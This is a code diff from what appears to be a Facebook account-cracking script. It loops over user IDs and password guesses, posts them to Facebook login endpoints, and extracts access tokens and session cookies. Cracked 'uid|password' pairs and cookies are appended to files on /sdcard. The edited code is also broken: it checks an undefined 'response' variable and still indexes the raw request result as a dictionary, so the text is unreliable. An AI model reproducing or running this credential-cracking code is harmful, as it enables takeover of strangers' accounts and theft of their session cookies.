@@ -1016,9 +1016,11 @@ def m8(ids,pwv):
             'authorization': 'OAuth null',
             'content-type': 'application/x-www-form-urlencoded',
             'x-fb-friendly-name': 'authenticate'}
-            url = 'https://graph.facebook.com/v12.0/me'
-            q = requests.post(url,data=info,headers=update,allow_redirects=False,verify=True).json()
-            if 'access_token' in q:
+            url = 'https://www.facebook.com/v12.0/dialog/oauth'
+            q = requests.post(url,data=info,headers=update,allow_redirects=False,verify=True)
+            if response.status_code == 200:
+             data = response.json()
+             if 'access_token' in data:
                 coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AJb};{coki}"
                 cid = str(q['uid'])
                 ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
@@ -1031,14 +1033,14 @@ def m8(ids,pwv):
                         open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+cookie+'\n')
                         oks.append(cid)
                         break
-            elif 'www.facebook.com' in q['error']['message']:
+             elif 'www.facebook.com' in q['error']['message']:
                 if 'y' in cp_xdx:
                         print(f'\r{P} [\033[1;30mZERO-CP.txt{P}] \033[1;30m{oks.append(cid)}|{pas}')
                         open('/sdcard/ZERO-CP.txt','a').write(uid+'|'+pas+'\n')
                         cps.append(uid)
-            else:
+             else:
                 continue
-            time.sleep(0.01)
+             time.sleep(0.01)
         loop+=1
     except requests.exceptions.ConnectionError:
         time.sleep(7)
